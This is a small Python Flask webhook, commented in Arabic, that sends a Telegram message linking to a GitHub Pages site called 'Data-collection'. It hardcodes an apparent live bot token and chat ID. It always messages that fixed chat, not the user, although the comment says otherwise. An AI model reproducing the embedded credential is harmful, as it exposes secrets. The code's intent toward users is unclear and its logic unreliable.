from flask import Flask, request
import requests

app = Flask(__name__)

# بيانات البوت
BOT_TOKEN = "7913260818:AAGT5rKbYr6RdKrO5O3OKmBKbSpsdSZ_Z5Y"
CHAT_ID = "6514749116"

# رابط API الخاص بـ Telegram
TELEGRAM_API_URL = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"

@app.route("/", methods=["GET", "POST"])
def webhook():
    # عندما يتلقى البوت طلبًا
    if request.method == "POST":
        # رسالة يتم إرسالها إلى المستخدم عند الضغط على "بدء"
        message = "مرحبًا! هذا هو الرابط الخاص بك:\n\nhttps://hanoybot.github.io/Data-collection/"
        
        # إرسال الطلب إلى Telegram
        data = {"chat_id": CHAT_ID, "text": message}
        response = requests.post(TELEGRAM_API_URL, json=data)

        # التحقق من نجاح الإرسال
        if response.status_code == 200:
            return "تم الإرسال بنجاح!", 200
        else:
            return f"خطأ أثناء الإرسال: {response.text}", 400
    else:
        return "بوت يعمل!", 200

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)